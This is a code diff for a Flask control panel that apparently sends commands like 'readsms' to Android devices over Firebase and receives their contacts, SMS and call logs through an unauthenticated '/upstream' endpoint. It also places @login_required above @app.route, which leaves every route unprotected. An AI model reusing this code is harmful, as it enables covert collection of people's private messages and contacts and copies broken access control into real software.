@@ -1,4 +1,4 @@
-from flask import Flask, render_template, url_for, request,redirect
+from flask import Flask, render_template, url_for, request, redirect, abort, session
 from flask_bootstrap import Bootstrap
 from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
 from flask_sqlalchemy import SQLAlchemy
@@ -19,6 +19,7 @@ loginManager.init_app(app)
 loginManager.login_view = 'login'
 
 
+@login_required
 @app.route('/home')
 def home():
     devices = deviceTable.query.with_entities(deviceTable)
@@ -27,6 +28,7 @@ def home():
     return render_template('home.html', dev=devices, count=devicesCount, name=current_user.id)
 
 
+@login_required
 @app.route('/info')
 def devInfo():
     deviceInit = deviceTable.query.with_entities(deviceTable.instanceID, deviceTable.device, deviceTable.model, deviceTable.product, deviceTable.brand, deviceTable.id)
@@ -36,6 +38,7 @@ def devInfo():
     return render_template('devInfo.html', dev1=deviceInit, dev2=deviceState, count1=count1, count2=count2, name=current_user.id)
 
 
+@login_required
 @app.route('/data', methods=['GET', 'POST'])
 def devData():
     devId = deviceTable.query.with_entities(deviceTable.instanceID)
@@ -54,9 +57,16 @@ def devData():
             device_token = ""  # need to retrieve device token from database
             dataMessage = {"command": "readsms"}
         firebase(device_token, dataMessage)
-    return render_template('devData.html', name=current_user.id, devsId=devId, count=count)
+    if session['contacts']:
+        service = session['contacts']
+    elif session['sms']:
+        service=session['sms']
+    elif session['callLog']:
+        service = session['callLog']
+    return render_template('devData.html', name=current_user.id, devsId=devId, count=count, service=service)
 
 
+@login_required
 @app.route('/operations', methods=['GET', 'POST'])
 def devOp():
     devId = deviceTable.query.with_entities(deviceTable.instanceID)
@@ -94,6 +104,7 @@ def devOp():
     return render_template('devOp.html', name=current_user.id, devsId=devId, count=count)
 
 
+@login_required
 @app.route('/configs', methods=['GET', 'POST'])
 def devConfig():
     devId = deviceTable.query.with_entities(deviceTable.instanceID)
@@ -144,6 +155,30 @@ def logout():
 def userLogout():
     logout_user()
     return redirect(url_for('logout'))
+
+
+@app.route('/upstream', methods=['POST'])
+def upstream():
+    if not request.json:
+        abort(400)
+    elif request.json['info']:
+        pass
+    elif request.json['data']:
+        pass
+    elif request.json['contacts']:
+        contacts = request.json['contacts']
+        session['contacts'] = contacts
+        redirect(url_for('devData'))
+    elif request.json['sms']:
+        sms = request.json['sms']
+        session['sms']=sms
+        redirect(url_for('devData'))
+    elif request.json['callLog']:
+        callLog = request.json['callLog']
+        session['callLog']=callLog
+        redirect(url_for('devData'))
+    else:
+        pass
 
 
 class adminTable(UserMixin, db.Model):
